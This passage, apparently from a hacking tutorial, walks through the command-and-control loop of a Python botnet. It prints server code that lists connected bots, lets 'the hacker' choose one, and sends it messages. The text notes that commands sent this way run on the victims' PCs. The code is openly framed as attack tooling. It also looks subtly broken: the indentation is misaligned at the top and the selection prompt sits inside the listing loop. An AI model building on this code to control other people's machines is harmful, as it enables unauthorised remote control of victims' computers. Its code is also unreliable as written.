Next, we will run a loop for the command-and-control center. While the clients are connected, we will display the clients and ask the hacker to select the client they want to interact with. Next, we run an internal loop for each bot, which will help us send messages to each bot individually by accessing the element in the list. Here you can define your own logic for a bot. You can send commands over to the bot and run those commands on the PC that the bot is running on. The rest is left up to you to define the functionality as you want. Here we are simply sending a message. Once you have achieved your objective, you can remove the client from the list:

```
run_cnc = True
    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                print("\t\t", i, "\t", c.getpeername())

                selected_client = int(input("[+] Select client by index: "))
                bot = clients[selected_client]
                run_bot = True
                while run_bot:
                    msg = input("[+] Enter Msg: ")
                    msg = msg.encode()
                    bot.send(msg)
                    if msg.decode() == "exit":
                        run_bot = False
                status = bot.recv(1024)
                if status == "disconnected".encode():
                    bot.close()
                    clients.remove(bot)


                print("data sent")
        else:
            print("[+] No clients connected")
        ans = input("[+] Do you want to exit? press [y/n] ")
        if ans == "y":
            run_cnc = False
```